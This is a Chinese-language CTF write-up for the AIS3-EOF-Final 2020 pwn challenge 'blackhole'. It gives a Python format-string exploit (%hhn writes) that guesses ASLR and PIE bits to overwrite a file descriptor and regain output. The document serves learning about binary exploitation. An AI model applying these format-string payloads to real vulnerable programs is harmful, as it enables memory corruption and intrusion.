AIS3-EOF-Final 2020 - [pwn] blackhole
===
- [Description](#Description)
- [Exploit](#Exploit)
- [Reference](#Reference)

# Description
題目跟 whitehole 只差在 fd 為 2, 所以無法看到輸出

# Exploit
```python
stack = random.randrange(0x10, 0xf0, 0x10)
ptrfd = random.randrange(0x10, 0xf0, 0x10)

send('%{}c%5$hhn'.format(stack+8).encode(), maxTime * (stack+8) / 255 + 0.2) # guess stack LSB: 0x?8
send(b'%16c%7$hhn\0', maxTime * 16 / 255 + 0.2) # rewrite ptr to fd: 0x?010
send('%{}c%5$hhn'.format(stack+8+1).encode(), maxTime * (stack+8+1) / 255 + 0.2)
send('%{}c%7$hhn\0'.format(ptrfd).encode(), maxTime * ptrfd / 255 + 0.2)
send(b'c%8$hhn\0')    # rewrite fd: 1
```
主要是
- 利用 `rsp+0` 將 `rsp+0x10` 的內容改為 `rsp+0x18` 的位址
    - 因為 `rsp+0x10` 的內容原本就存著 stack 段的 address
    - 所以將其改為 `rsp+0x18` 的位址只需要一個 byte
    - 又因這兩 byte 中只有其中 4 bits 受到 ASLR 影響
    - 故猜中 `rsp+0x18` 位址的機率是 $\frac{1}{2^4}$
- 利用 `rsp+0x10` 將 `rsp+0x18`的內容改為 fd 的位址
    - 因為 `rsp+0x18` 的內容原本就存著 text 段的 address
    - 所以將其改為 fd 的位址只需要改兩個 byte
    - 又因這兩 byte 中只有其中 4 bits 受到 PIE 影響
    - 故猜中 fd 位址的機率是 $\frac{1}{2^4}$
- 利用 `rsp+0x18` 將 fd 的內容改為 1
- 至此, 就能得到輸出

若有輸出, 則表示前面 stack, fd 的位址都猜中了, 機率為 $\frac{1}{2^8}$

有輸出後, 做法就跟 whitehole 一樣了

# Reference

###### tags: `CTF`